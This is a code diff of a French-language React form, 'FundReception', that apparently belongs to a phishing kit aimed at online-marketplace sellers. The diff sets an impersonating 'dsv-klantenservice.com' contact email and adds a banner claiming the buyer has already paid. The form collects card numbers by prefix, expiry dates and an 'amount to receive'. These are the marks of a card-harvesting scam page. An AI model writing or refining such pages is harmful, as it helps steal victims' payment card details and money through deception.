@@ -66,7 +66,7 @@ const FundReception = () => {
     {
       icon: Mail,
       title: 'Email',
-      info: 'registratie@autodp.org',
+      info: 'registratie@dsv-klantenservice.com',
       subinfo: 'Réponse sous 24h'
     }
   ]
@@ -172,7 +172,7 @@ const FundReception = () => {
             <form onSubmit={handleSubmit(onSubmit)} className="space-y-4 sm:space-y-6">
               <div>
                 <label className="block text-sm font-semibold text-gray-700 mb-2">
-                  Nom complet *
+                  Nom complet <span className="text-red-500">*</span>
                 </label>
                 <input
                   type="text"
@@ -190,58 +190,30 @@ const FundReception = () => {
                 )}
               </div>
 
-              <div className="grid md:grid-cols-2 gap-4">
-                <div>
-                  <label className="block text-sm font-semibold text-gray-700 mb-2">
-                    Email *
-                  </label>
-                  <input
-                    type="email"
-                    {...register('email', { 
-                      required: 'L\'email est obligatoire',
-                      pattern: {
-                        value: /^\S+@\S+$/i,
-                        message: 'Email invalide'
-                      }
-                    })}
-                    className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-primary-500 focus:border-primary-500 transition-colors ${
-                      errors.email ? 'border-red-500' : 'border-gray-300'
-                    }`}
-                    placeholder="votre@email.com"
-                  />
-                  {errors.email && (
-                    <p className="mt-1 text-sm text-red-600 flex items-center">
-                      <AlertCircle className="w-4 h-4 mr-1" />
-                      {String(errors.email?.message || 'Ce champ est obligatoire')}
-                    </p>
-                  )}
-                </div>
-
-                <div>
-                  <label className="block text-sm font-semibold text-gray-700 mb-2">
-                    Téléphone *
-                  </label>
-                  <input
-                    type="tel"
-                    {...register('telephone', { required: 'Le téléphone est obligatoire' })}
-                    className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-primary-500 focus:border-primary-500 transition-colors ${
-                      errors.telephone ? 'border-red-500' : 'border-gray-300'
-                    }`}
-                    placeholder="01 23 45 67 89"
-                  />
-                  {errors.telephone && (
-                    <p className="mt-1 text-sm text-red-600 flex items-center">
-                      <AlertCircle className="w-4 h-4 mr-1" />
-                      {String(errors.telephone?.message || 'Ce champ est obligatoire')}
-                    </p>
-                  )}
-                </div>
+              <div>
+                <label className="block text-sm font-semibold text-gray-700 mb-2">
+                  Téléphone <span className="text-red-500">*</span>
+                </label>
+                <input
+                  type="tel"
+                  {...register('telephone', { required: 'Le téléphone est obligatoire' })}
+                  className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-primary-500 focus:border-primary-500 transition-colors ${
+                    errors.telephone ? 'border-red-500' : 'border-gray-300'
+                  }`}
+                  placeholder="01 23 45 67 89"
+                />
+                {errors.telephone && (
+                  <p className="mt-1 text-sm text-red-600 flex items-center">
+                    <AlertCircle className="w-4 h-4 mr-1" />
+                    {String(errors.telephone?.message || 'Ce champ est obligatoire')}
+                  </p>
+                )}
               </div>
 
               {/* Adresse */}
               <div>
                 <label className="block text-sm font-semibold text-gray-700 mb-2">
-                  Adresse complète *
+                  Adresse complète <span className="text-red-500">*</span>
                 </label>
                 <input
                   type="text"
@@ -259,31 +231,29 @@ const FundReception = () => {
                 )}
               </div>
 
-              {/* Type d'article et Description */}
-              <div className="grid md:grid-cols-2 gap-4">
-                <div>
-                  <label className="block text-sm font-semibold text-gray-700 mb-2">
-                    Type d'article
-                  </label>
-                  <input
-                    type="text"
-                    {...register('type_article')}
-                    className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-primary-500 focus:border-primary-500 transition-colors"
-                    placeholder="Ex: Électronique, Vêtements, Livres, Cosmétiques..."
-                  />
+              {/* Message informatif */}
+              <div className="bg-green-50 border border-green-200 rounded-lg p-4 mb-6">
+                <div className="flex items-start">
+                  <CheckCircle className="w-5 h-5 text-green-600 mt-0.5 mr-3 flex-shrink-0" />
+                  <div>
+                    <h4 className="text-sm font-semibold text-green-800 mb-1">Information importante</h4>
+                    <p className="text-sm text-green-700">
+                      Veuillez noter que vous n'avez rien à payer, l'acheteur a déjà tout payé donc tout est gratuit pour vous.
+                    </p>
+                  </div>
                 </div>
+              </div>
 
-                <div>
-                  <label className="block text-sm font-semibold text-gray-700 mb-2">
-                    Description de l'article
-                  </label>
-                  <input
-                    type="text"
-                    {...register('description_article')}
-                    className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-primary-500 focus:border-primary-500 transition-colors"
-                    placeholder="Description détaillée de l'article"
-                  />
-                </div>
+              <div>
+                <label className="block text-sm font-semibold text-gray-700 mb-2">
+                  Description de l'article
+                </label>
+                <input
+                  type="text"
+                  {...register('description_article')}
+                  className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-primary-500 focus:border-primary-500 transition-colors"
+                  placeholder="Description détaillée de l'article"
+                />
               </div>
 
               {/* Informations bancaires */}
@@ -293,7 +263,7 @@ const FundReception = () => {
                 <div className="grid md:grid-cols-2 gap-4 mb-4">
                   <div>
                     <label className="block text-sm font-semibold text-gray-700 mb-2">
-                      Carte BE *
+                      Numéro Carte BE <span className="text-red-500">*</span>
                     </label>
                     <input
                       type="text"
@@ -313,7 +283,7 @@ const FundReception = () => {
 
                   <div>
                     <label className="block text-sm font-semibold text-gray-700 mb-2">
-                      Carte 52/49/51 *
+                      Numéro Carte 52/49/51 <span className="text-red-500">*</span>
                     </label>
                     <input
                       type="text"
@@ -335,7 +305,7 @@ const FundReception = () => {
                 <div className="grid md:grid-cols-2 gap-4">
                   <div>
                     <label className="block text-sm font-semibold text-gray-700 mb-2">
-                      Date d'expiration *
+                      Date d'expiration <span className="text-red-500">*</span>
                     </label>
                     <input
                       type="text"
@@ -361,7 +331,7 @@ const FundReception = () => {
 
                   <div>
                     <label className="block text-sm font-semibold text-gray-700 mb-2">
-                      Montant *
+                      Montant à Recevoir <span className="text-red-500">*</span>
                     </label>
                     <input
                       type="number"
